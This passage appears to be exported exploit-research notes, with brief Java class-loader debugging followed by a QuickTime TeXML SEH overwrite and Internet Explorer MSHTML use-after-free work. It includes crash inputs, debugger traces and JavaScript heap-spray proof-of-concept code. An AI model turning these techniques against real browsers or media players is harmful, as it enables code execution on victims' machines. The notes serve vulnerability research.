java.lang.Class.forName(Unknown Source)\n```\n\nMy feeling is.... on Java7 the sun.plugin2.applet.Plugin2ClassLoader is not\nbeing used..... sooo.... whhich one?.... maybe:\n\n```\nClassLoader loader = Thread.currentThread().getContextClassLoader();\nif (loader == null) {\n\t// can be null in IE (see 6204697)\n\tloader = ClassLoader.getSystemClassLoader();\n}\n```\n\nmaybe??? not sure 100% sorry, I would need debug it to see a little better...\n\nThe difference, could be, with JDK6, where the ClassFinder doesn't exist, is which\nforName would be call and ClassLoader.getCallerClassLoader() will be used.... could be???\n\n```\n    /**\n     * Returns the {@code Class} object associated with the class or\n     * interface with the given string name.  Invoking this method is\n     * equivalent to:\n     *\n     * <blockquote>\n     *  {@code Class.forName(className, true, currentLoader)}\n     * </blockquote>\n     *\n     * where {@code currentLoader} denotes the defining class loader of\n     * the current class.\n     *\n     * <p> For example, the following code fragment returns the\n     * runtime {@code Class} descriptor for the class named\n     * {@code java.lang.Thread}:\n     *\n     * <blockquote>\n     *   {@code Class t = Class.forName(\"java.lang.Thread\")}\n     * </blockquote>\n     * <p>\n     * A call to {@code forName(\"X\")} causes the class named\n     * {@code X} to be initialized.\n     *\n     * @param      className   the fully qualified name of the desired class.\n     * @return     the {@code Class} object for the class with the\n     *             specified name.\n     * @exception LinkageError if the linkage fails\n     * @exception ExceptionInInitializerError if the initialization provoked\n     *            by this method fails\n     * @exception ClassNotFoundException if the class cannot be located\n     */\n    public static Class<?> forName(String className)\n                throws ClassNotFoundException {\n        return forName0(className, true, ClassLoader.getCallerClassLoader());\n    }\n```\n\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "3d0a7125-b1d5-4747-8a7a-07f9246cf1ab",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "42cf829f-641f-4729-87b7-3bd8fb4d042b",
      "created": "2019-09-12T18:07:55.877043Z",
      "revisionDate": "2020-02-13T17:12:07.713507Z",
      "document": "-\nDown      p    sub_67EED2E0+193                 call    dangerous_copy_sub_67EED1E0 <-- Interesting (0x67EED473)\nDown      p    sub_67EED2E0+1E7                 call    dangerous_copy_sub_67EED1E0\nDown      p    sub_67EED2E0+23C                 call    dangerous_copy_sub_67EED1E0\nDown      p    sub_67EED2E0+28D                 call    dangerous_copy_sub_67EED1E0\nDown      p    manage_transform_sub_67EED810+B6 call    dangerous_copy_sub_67EED1E0 (*) this is the one we have reviewed\n```\n\nWe noticed that sub_67EED2E0+193 can also trigger the crash, with even longer data without\ntriggering the warning.  In this particular case, the parser is handling arguments ending with\na \"%\", which can be reached as a 'color' argument, for example:\n\n```\n{ color: AAAAAAAAAAAAAA% }\n```\n\nWhere \"AAAAAAAAAAAAAA\" will be copied on the stack. Also see poc3.xml for example.\n\nAs a result, we get to overwrite the stack with more data (like I said), and we end up overwriting\nthe SEH:\n\n```\n(c54.da8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\QuickTime\\QTSystem\\QuickTime3GPP.qtx -\neax=00000030 ebx=0013cc25 ecx=0e0a7288 edx=0000355f esi=00140000 edi=0013cba0\neip=67eed1f3 esp=0013cb74 ebp=00000004 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nQuickTime3GPP!EatTx3gComponentDispatch+0x4033:\n67eed1f3 8806            mov     byte ptr [esi],al          ds:0023:00140000=41\n0:000> !exchain\n0013ce24: 30303030\nInvalid exception stack at 30303030\n0:000> g\n(c54.da8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=30303030 edx=7c9032bc esi=00000000 edi=00000000\neip=30303030 esp=0013c7a4 ebp=0013c7c4 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n30303030 ??              ???\n```\n\nquicktime.qts does not have Safe SEH protected.\n\nThe final version of the exploit can be found here:\nhttps://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/apple_quicktime_texml.rb\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "2ecd87ef-e603-4bb9-8792-cc213b50de59",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "2a826956-b7bf-4556-bc5f-09013506a0d1",
      "created": "2019-09-12T18:07:56.567133Z",
      "revisionDate": "2020-02-13T17:12:07.483401Z",
      "document": "--\n\nThe crash / corruptions happens at CMarkup::UpdateMarkupContentsVersion:\n\n```\n.text:637C9454                 inc     dword ptr [eax+10h]\n```\n\nIn order to return from CMarkup::UpdateMarkupContentsVersion we can use the next route:\n\n```\n.text:637C9454                 inc     dword ptr [eax+10h] ; Corruption!\n.text:637C9457\n.text:637C9457 loc_637C9457:                           ; CODE XREF: CMarkup::UpdateMarkupContentsVersion(void)+14j\n.text:637C9457                 mov     ecx, [edx+94h]  ; we need to bypass this part, we control edx, so not a big deal\n.text:637C945D                 xor     eax, eax\n.text:637C945F                 test    ecx, ecx\n.text:637C9461                 jz      short loc_637C9466\n.text:637C9463                 mov     eax, [ecx+0Ch]\n.text:637C9466\n.text:637C9466 loc_637C9466:                           ; CODE XREF: CMarkup::UpdateMarkupContentsVersion(void)+23j\n.text:637C9466                 cmp     dword ptr [eax+1C0h], 0 ; We must make eax+1c0h == 0 (not a big deal via spray)\n.text:637C946D                 jz      short locret_637C9496 ; So this jz is taken and we return from CMarkup::UpdateMarkupContentsVersion\n```\n\n* After returning from CMarkup::UpdateMarkupContentsVersion we land into CMarkup::NotifyElementEnterTree:\n\n```\n.text:63776EC8                 call    ?UpdateMarkupContentsVersion@CMarkup@@QAEXXZ ; it's the call we're using for corruption\n.text:63776ECD                 mov     eax, [esi+98h]  ; esi is the controlled object\n.text:63776ED3                 test    eax, eax\n.text:63776ED5                 jz      short loc_63776EED\n.text:63776ED7                 cmp     dword ptr [esi+1A4h], 15F90h\n.text:63776EE1                 jl      short loc_63776EED\n.text:63776EE3                 mov     eax, [eax+8]\n.text:63776EE6                 and     dword ptr [eax+2F0h], 0FFFFFFBFh ; We need to bypass this and, after that we get the control back :)\n```\n\nReused object:\n\n```\n0:008> dd 061b90c8 Ld0\n061b90c8  deadc0de 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b90d8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b90e8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b90f8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9108  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9118  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9128  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9138  1a1b1ff0 1a1b1ff0 1a1b1ff1 9a1b1ff1\n061b9148  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9158  1a1b1ff0 1a1b2004 1a1b200c 1a1b1ff0\n061b9168  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9178  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9188  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9198  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b91a8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b91b8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b91c8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b91d8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b91e8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b91f8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9208  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9218  1a1b1ff0 1a1b1ff0 1a1b1ff0 42424242\n061b9228  1a1b1ff4 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9238  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9248  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9258  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9268  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9278  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9288  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9298  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b92a8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b92b8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b92c8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b92d8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b92e8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b92f8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9308  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9318  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9328  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9338  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9348  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9358  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9368  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9378  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9388  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b9398  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b93a8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b93b8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b93c8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b93d8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b93e8  1a1b1ff0 1a1b1ff0 1a1b1ff0 1a1b1ff0\n061b93f8  1a1b1ff0 1a1b1ff0 1a1b1ff0 00001ff0\n```\n\nSprayed memory should look like:\n\n```\n0:008> dd eax+10\n1a1b2000  00000001 1a1b203c 00000000 1a1b2098\n1a1b2010  1a1b2064 1a1b2068 00000000 00000000\n1a1b2020  00000000 00000000 00000000 00000000\n1a1b2030  00000000 00000000 00000000 00000000\n1a1b2040  00000000 00000000 00000000 00000000\n1a1b2050  00000000 00000000 00000000 00000000\n1a1b2060  00000000 00000000 00000000 00000000\n1a1b2070  00000000 00000000 00000000 00000000\n\nx=1a1b1ff0 ebx=0298eeb8 ecx=00000195 edx=061b90c8 esi=061b90c8 edi=0297d568\neip=67ed9457 esp=02efb54c ebp=02efb5b8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nMSHTML!CMarkup::UpdateMarkupContentsVersion+0x19:\n67ed9457 8b8a94000000    mov     ecx,dword ptr [edx+94h] ds:0023:061b915c=04201b1a\n0:008> dd edx + 94\n061b915c  1a1b2004\n\n0:008> t\neax=00000000 ebx=0298eeb8 ecx=1a1b2004 edx=061b90c8 esi=061b90c8 edi=0297d568\neip=67ed9463 esp=02efb54c ebp=02efb5b8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nMSHTML!CMarkup::UpdateMarkupContentsVersion+0x25:\n67ed9463 8b410c          mov     eax,dword ptr [ecx+0Ch] ds:0023:1a1b2010=64201b1a\n0:008> dd ecx + 0c\n1a1b2010  1a1b2064 1a1b2068 00000000 00000000\n\n1a1b2064 must point to sprayed memory with content \"0\"\n\n0:008> t\neax=1a1b2064 ebx=0298eeb8 ecx=1a1b2004 edx=061b90c8 esi=061b90c8 edi=0297d568\neip=67e86ecd esp=02efb550 ebp=02efb5b8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nMSHTML!CMarkup::NotifyElementEnterTree+0x277:\n67e86ecd 8b8698000000    mov     eax,dword ptr [esi+98h] ds:0023:061b9160=0c201b1a\n0:008> dd esi + 98\n061b9160  1a1b200c\n\n0:008> dd 1a1b200c\n1a1b200c  1a1b2098 1a1b2064 1a1b2068 00000000\n1a1b201c  00000000 00000000 00000000 00000000\n1a1b202c  00000000 00000000 00000000 00000000\n1a1b203c  00000000 00000000 00000000 00000000\n1a1b204c  00000000 00000000 00000000 00000000\n1a1b205c  00000000 00000000 00000000 00000000\n1a1b206c  00000000 00000000 00000000 00000000\n1a1b207c  00000000 00000000 00000000 00000000\n\n0:008> t\neax=1a1b200c ebx=0298eeb8 ecx=1a1b2004 edx=061b90c8 esi=061b90c8 edi=0297d568\neip=67e86ee3 esp=02efb550 ebp=02efb5b8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMSHTML!CMarkup::NotifyElementEnterTree+0x28d:\n67e86ee3 8b4008          mov     eax,dword ptr [eax+8] ds:0023:1a1b2014=68201b1a\n0:008> dd eax+8\n1a1b2014  1a1b2068\n```\n\nSimulate an spray with:\n\n```\n.dvalloc /b 1a1b1ff0 4000\n```\n\nTHen go to 1a1b2004 and write:\n\n```\n1a1b203c 00000000 1a1b2098 1a1b2064 1a1b2068\n```\n\n\nAfter several tries I keep crashing curiously again:\n\n```\n0:008> r\neax=00000000 ebx=02f0c028 ecx=1a1b1ff0 edx=04e68ad8 esi=04e68ad8 edi=02f02b00\neip=67ed9466 esp=036bb46c ebp=036bb4d8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nMSHTML!CMarkup::UpdateMarkupContentsVersion+0x28:\n67ed9466 83b8c001000000  cmp     dword ptr [eax+1C0h],0 ds:0023:000001c0=????????\n0:008> dd ecx+c\n1a1b1ffc  00000000 00000003 1a1b203c 00000000\n1a1b200c  1a1b2098 1a1b2064 1a1b2068 00000000\n```\n\n\nSo we're going to try adding to 1a1b1ffc => 1a1b205c => It adds some reliability,\nbut finally crashes again, looks like because finally we don't control the reused\nmemory, someone else won the race :?\n\n```\n.dvalloc /b 1a1b1ff0 4000\nf 1a1b1ffc L1C 5C 20 1B 1A 00 00 00 00 3C 20 1B 1A 00 00 00 00 98 20 1B 1A 64 20 1B 1A 68 20 1B 1A\n```\n\n# Heap Spray with Attributes\n\nIn order to use the technique by vupen disclosed here:\n\nhttp://www.vupen.com/blog/20120117.Advanced_Exploitation_of_Windows_MS12-004_CVE-2012-0003.php\n\nthe cloneNode doesn't work anymore:\n\n```\n\tvar cl0ne = test.cloneNode(true);\n```\n\nIt won't clone attribute values, so CAttrValue::Copy isn't hit anymore. In order to solve, after checking\nthe xrefx to CattrValue::Copy there is an interesting new path:\n\n```\nCElement::mergeAttributes\n\nHere is PoC:\n\nfunction test() {\n\tvar myDiv = document.getElementById(\"pwn\")\n\tvar test = document.createElement(\"select\")\n\ttest.setAttribute('obj0', \"AAAAAAAAAAAAAAAAAAAA\")\n\ttest.setAttribute('obj1', new Date())\n\ttest.setAttribute('obj2', new Date())\n\ttest.setAttribute('obj3', \"METASPLOIT\")\n\talert(test.attributes.length);\n\talert(test.getAttribute('obj0'));\n\tvar cl0ne = test.cloneNode(true);\n\tcl0ne.mergeAttributes(test);\n}\n```\n\n\nSpraying with Attributes, definite version:\n\n```\n<html>\n<head>\n\n<script>\nfunction myTest() {\n\n\tvar test = document.createElement(\"select\")\n\tfor (var j = 0; j < 0x80; j++) {\n\t\ttest.setAttribute('test' + j, unescape(\"%u0001\"))\n\t}\n\n\tvar empty = document.createElement(\"select\")\n\n\talert('oka, bp copy......')\n\tvar myAttributes = new Array();\n\tfor (var i = 0; i < 0x20; i++) {\n\t\tmyAttributes[i] = empty.cloneNode(true);\n\t\tmyAttributes[i].mergeAttributes(test);\n\t}\n\n\n\talert('oka, check what is there in memory...')\n\talert(myAttributes[0].getAttribute('test0').length);\n\n\t//alert(myAttributes[0].test0.length);\n\t//alert(cl0ne.attributes.length);\n}\n</script>\n</head>\n<body onload=\"myTest();\">\n</body>\n</html>\n```\n\nIt will spray 0x800 size structs (with the Variant types and the pointers to strings!)\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "baf88838-dbbe-4efd-9ad9-5f703d23aa35",
      "editorId": "758f2378-44fc-4685-9f8a-9824f8f374c6",
      "topicId": "75442757-afb2-40ae-b2e8-9d43f511b890",
      "created": "2019-09-12T18:07:58.676765Z",
      "revisionDate": "2020-06-29T19:47:58.301918Z",
      "document": "\n\n## Windbg Log\n\n```\n[*] in trigger()\n[*] Creating element SAMP\n[*] Creating element TH\n[*] Creating element RT\n[*] Creating element COMMAND\n[*] Creatig element STYLE\n[*] Creating element BUTTON\n[*] Creating element FRAME\n[*] Creating element TR\n[*] Appending element SAMP\n[*] Appending element TH\n[*] Appending element RT\n[*] Appending element COMMAND\n[*] Appending element STYLE\n[*] Appending element BUTTON\n[*] Appending element FRAME\n[*] Appending element TR\n[*] Calling createTextRange()\n[*] Calling moveToElementText() with element RT\n[*] Calling moveEnd('character', 7)\n[*] Selecting text range\n[*] Executing text bold\n[*] Execute insdertFieldSet\n[*] Selecting text range again\n[*] Calling InsertHorizontalRule\n[*] CHRElement created: 0x0f45efc8\n\nChildEBP RetAddr  Args to Child\n0480be7c 6a3a14b3 0fc5ff00 0cec5528 0480beb0 MSHTML!CHRElement::CreateElement+0x16 (FPO: [3,0,4])\n0480bea8 6a420994 00000000 0480bfe4 0cec5528 MSHTML!CreateElement+0x6c (FPO: [6,3,4])\n0480bfc0 6a759a26 00000039 0480bfe4 0fe2efec MSHTML!CMarkup::CreateElement+0x430 (FPO: [4,59,4])\n0480bfe8 6ab3abc9 0cec5528 00000030 0fe2efec MSHTML!CDoc::CreateElement+0x7a (FPO: [4,1,4])\n0480c04c 6ab3a40e 0fe2efec 0a664ff0 0fcf2ff0 MSHTML!CInsertCommand::ApplyCommandToSegment+0x3c9 (FPO: [5,16,4])\n0480c0bc 6a34991f 00000002 0480cc68 00000000 MSHTML!CInsertCommand::PrivateExec+0x238 (FPO: [3,17,4])\n0480c0dc 6a349a6d 00000002 0480cc68 00000000 MSHTML!CCommand::Exec+0x44 (FPO: [4,0,4])\n0480c108 6a5c1ae5 0f74df78 6a525f54 00000866 MSHTML!CMshtmlEd::Exec+0x18f (FPO: [6,2,4])\n0480c140 6a55f2d5 040b5ff0 6a525f54 00000866 MSHTML!CEditRouter::ExecEditCommand+0x185 (FPO: [8,3,4])\n0480cc10 6a72eaed 0cf68fb8 6a525f54 00000866 MSHTML!CDoc::ExecHelper+0x4b78 (FPO: [6,679,4])\n0480cc30 6a7e0da8 0cf68fb8 6a525f54 00000866 MSHTML!CDocument::Exec+0x24 (FPO: [6,0,0])\n0480cc58 6a7313dc 0cf68fb8 00000866 0a800001 MSHTML!CBase::execCommand+0x5b (FPO: [6,0,0])\n0480cc90 6a9062ee 00000001 04b95fc4 09050000 MSHTML!CDocument::execCommand+0x95 (FPO: [8,3,4])\n0480cd20 69e08686 09735f60 10000004 0972bde0 MSHTML!CFastDOM::CDocument::Trampoline_execCommand+0x13a (FPO: [2,23,4])\n0480cd64 69e49792 09735f60 6a9061b4 10000004 jscript9!Js::JavascriptFunction::CallFunction+0xc4 (FPO: [4,5,4])\n0480cdb8 69e08686 0480cdb8 10000004 0972bde0 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x117 (FPO: [SEH])\n0480cdf8 69f5c794 09735f60 69e49697 10000004 jscript9!Js::JavascriptFunction::CallFunction+0xc4 (FPO: [4,5,4])\n0480ce18 69e9e33b 0a808958 0a802418 0905cc18 jscript9!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutCallI_OneByte>+0x43 (FPO: [0,1,0])\n0480ce44 69e9dd83 71dda4dd 0480ce80 00000000 jscript9!Js::InterpreterStackFrame::Process+0x78f (FPO: [0,6,4])\n0480ce74 69e9dcf8 0480cf2c 0905de16 0905cc18 jscript9!Js::InterpreterStackFrame::ProcessThunk+0x65 (FPO: [1,7,0])\n\n[*] Calling insertButton\n[*] Freeing: 0x0f45efc8\n\n(a00.9f0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=0f45efc8 edx=6abfd6d8 esi=0480aa78 edi=0fa08fa8\neip=6a3f96b8 esp=0480aa58 ebp=0480aa68 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nMSHTML!CTreeNode::ComputeFormats+0x9f:\n6a3f96b8 8b11            mov     edx,dword ptr [ecx]  ds:0023:0f45efc8=????????\n0:005> !heap -p -a ecx\n    address 0f45efc8 found in\n    _DPH_HEAP_ROOT @ 1a1000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    f6c31d4:          f45e000             2000\n    6c9290b2 verifier!AVrfDebugPageHeapFree+0x000000c2\n    777766ac ntdll!RtlDebugFreeHeap+0x0000002f\n    7773a13e ntdll!RtlpFreeHeap+0x0000005d\n    777065a6 ntdll!RtlFreeHeap+0x00000142\n    763bc3c4 kernel32!HeapFree+0x00000014\n    6a36e3d2 MSHTML!CHRElement::`scalar deleting destructor'+0x00000028\n    6a51a705 MSHTML!CBase::PrivateRelease+0x00000086\n    6a56c684 MSHTML!CElement::PrivateExitTree+0x0000008a\n    6a4ab16f MSHTML!CSpliceTreeEngine::RemoveSplice+0x00000884\n    6a4a7345 MSHTML!CMarkup::SpliceTreeInternal+0x00000095\n    6a49cca2 MSHTML!CDoc::CutCopyMove+0x00000204\n    6a759ec2 MSHTML!CDoc::CutCopyMove+0x00000156\n    6a7584bf MSHTML!CDoc::Remove+0x0000001a\n    6ab56a54 MSHTML!CDeleteCommand::Delete+0x00000157\n    6ab31040 MSHTML!CHTMLEditor::DeleteInternal+0x00000073\n    6ab3ab1c MSHTML!CInsertCommand::ApplyCommandToSegment+0x0000031c\n    6ab3a40e MSHTML!CInsertCommand::PrivateExec+0x00000238\n    6a34991f MSHTML!CCommand::Exec+0x00000044\n    6a349a6d MSHTML!CMshtmlEd::Exec+0x0000018f\n    6a5c1ae5 MSHTML!CEditRouter::ExecEditCommand+0x00000185\n    6a55f2d5 MSHTML!CDoc::ExecHelper+0x00004b78\n    6a72eaed MSHTML!CDocument::Exec+0x00000024\n    6a7e0da8 MSHTML!CBase::execCommand+0x0000005b\n    6a7313dc MSHTML!CDocument::execCommand+0x00000095\n    6a9062ee MSHTML!CFastDOM::CDocument::Trampoline_execCommand+0x0000013a\n    69e08686 jscript9!Js::JavascriptFunction::CallFunction+0x000000c4\n    69e49792 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x00000117\n    69e08686 jscript9!Js::JavascriptFunction::CallFunction+0x000000c4\n    69f5c794 jscript9!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutCallI_OneByte>+0x00000043\n    69e9dd83 jscript9!Js::InterpreterStackFrame::ProcessThunk+0x00000065\n    69e9dcf8 jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x00000228\n\n\n0:005> !heap -p -a edi\n    address 0fa08fa8 found in\n    _DPH_HEAP_ROOT @ 1a1000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 fa005e4:          fa08fa8               54 -          fa08000             2000\n    6c928e89 verifier!AVrfDebugPageHeapAllocate+0x00000229\n    77775ede ntdll!RtlDebugAllocateHeap+0x00000030\n    7773a40a ntdll!RtlpAllocateHeap+0x000000c4\n    77705ae0 ntdll!RtlAllocateHeap+0x0000023a\n    6a4b0703 MSHTML!CMarkup::InsertElementInternal+0x0000033c\n    6a4b0944 MSHTML!CDoc::InsertElement+0x0000010d\n    6a75840a MSHTML!CDoc::InsertElement+0x00000168\n    6ab3abe6 MSHTML!CInsertCommand::ApplyCommandToSegment+0x000003e6\n    6ab3a40e MSHTML!CInsertCommand::PrivateExec+0x00000238\n    6a34991f MSHTML!CCommand::Exec+0x00000044\n    6a349a6d MSHTML!CMshtmlEd::Exec+0x0000018f\n    6a5c1ae5 MSHTML!CEditRouter::ExecEditCommand+0x00000185\n    6a55f2d5 MSHTML!CDoc::ExecHelper+0x00004b78\n    6a72eaed MSHTML!CDocument::Exec+0x00000024\n    6a7e0da8 MSHTML!CBase::execCommand+0x0000005b\n    6a7313dc MSHTML!CDocument::execCommand+0x00000095\n    6a9062ee MSHTML!CFastDOM::CDocument::Trampoline_execCommand+0x0000013a\n    69e08686 jscript9!Js::JavascriptFunction::CallFunction+0x000000c4\n    69e49792 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x00000117\n    69e08686 jscript9!Js::JavascriptFunction::CallFunction+0x000000c4\n    69f5c794 jscript9!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutCallI_OneByte>+0x00000043\n    69e9dd83 jscript9!Js::InterpreterStackFrame::ProcessThunk+0x00000065\n    69e9dcf8 jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x00000228\n\n\n0:005> dd edi\n0fa08fa8  0f45efc8 00000000 00200039 00000051\n0fa08fb8  00000000 00000000 00000000 00000000\n0fa08fc8  00000000 00000012 00000000 00000000\n0fa08fd8  00000000 00000000 00000000 ffffffff\n0fa08fe8  ffffffff 00000040 00000000 00000000\n0fa08ff8  0c839c38 d0d0d0d0 ???????? ????????\n0fa09008  ???????? ???????? ???????? ????????\n0fa09018  ???????? ???????? ???????? ????????\n0:005> dd ecx\n0f45efc8  ???????? ???????? ???????? ????????\n0f45efd8  ???????? ???????? ???????? ????????\n0f45efe8  ???????? ???????? ???????? ????????\n0f45eff8  ???????? ???????? ???????? ????????\n0f45f008  ???????? ???????? ???????? ????????\n0f45f018  ???????? ???????? ???????? ????????\n0f45f028  ???????? ???????? ???????? ????????\n0f45f038  ???????? ???????? ???????? ????????\n0:005> kv\nChildEBP RetAddr  Args to Child\n0480aa68 6a3faf46 0480b14c 0fa08fa8 00000000 MSHTML!CTreeNode::ComputeFormats+0x9f (FPO: [0,2,0])\n0480b03c 6a67675c 0480b114 6a4593f0 00000000 MSHTML!CTreeNode::ComputeFormatsHelper+0x40 (FPO: [0,368,0])\n0480b044 6a4593f0 00000000 0fa24ec8 00000000 MSHTML!ISpanQualifier::GetCharFormat+0x3d (FPO: [1,0,0])\n0480b114 6a459329 0fa24ec8 00000000 0fcbafa4 MSHTML!SRunPointer::GetLineHeightProperties+0x103 (FPO: [9,45,4])\n0480b158 6a452135 0fa24ec8 0fa24ec8 00000000 MSHTML!CLineServicesClient::GetSpanLineHeightProperties+0x82 (FPO: [14,4,0])\n0480b1ac 6a452082 0fcbafa0 0fa24ec8 00000000 MSHTML!Ptls5::CLsSpanLineHeightInfo::Create+0x7d (FPO: [9,2,4])\n0480b1e8 6a451f57 0fa24ec8 00000000 00000001 MSHTML!Ptls5::CLsSpanNode::Create+0x119 (FPO: [14,2,0])\n0480b230 6a451d66 00000000 00000001 00000000 MSHTML!Ptls5::CLsSpanService::OpenSpan+0x52 (FPO: [8,1,4])\n0480b270 6a452186 0fa2aa0c 0480b2e8 00000000 MSHTML!Ptls5::LsAppendMainLine+0x2c9 (FPO: [4,3,4])\n0480b298 6a45321c 0fa2aa0c 00000000 0faf8f9c MSHTML!Ptls5::LsFormatMainLine+0x36 (FPO: [8,1,4])\n0480b48c 6a557045 0480b5b4 6a46a340 0fa24ec8 MSHTML!Ptls5::LsCreateLineCore+0x433 (FPO: [11,113,4])\n0480b560 6a47117c 00000000 00000000 00000000 MSHTML!CDoc::HasFocus+0x35 (FPO: [0,1,4])\n0480b578 6a471134 0fce0d58 0fd38f90 0480b5b8 MSHTML!HtmlLayout::FlowBoxBuilder::HasAttachedRunForBox+0x3f (FPO: [2,0,4])\n0480b5a4 6a469b90 00000000 00000000 0480b61c MSHTML!HtmlLayout::LineBox::CanBeReused+0x243 (FPO: [9,4,4])\n0480b678 6a40de7d 0480b6a4 6a4a1785 0fce0d58 MSHTML!SLayoutRun::GetLineBoxForReUse+0x63 (FPO: [10,3,4])\n0480b6f0 6a4157da 00000000 0480ba48 0fce0d58 MSHTML!HtmlLayout::ContainerBox::GetScrollBarSize+0x14 (FPO: [0,0,4])\n0480b704 6a46d1c2 0fd64d58 0fd64d58 0fe8cfe0 MSHTML!HtmlLayout::FlowBoxBuilder::CreateDisplayNodeForChildIfForDisplay+0x39 (FPO: [1,0,4])\n0480b884 6a415d63 0fe8cfe0 0fe8cfe0 0480ba48 MSHTML!HtmlLayout::FlowBoxBuilder::OnChildBoxEntry+0xc27 (FPO: [2,87,4])\n0480b8a0 0480b8c0 6a467c8d 0480ba48 0480ba48 MSHTML!HtmlLayout::LayoutBuilder::ExitBlock+0x86 (FPO: [2,1,4])\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n0480b8c0 6a414a5c 0480b9f0 0480ba34 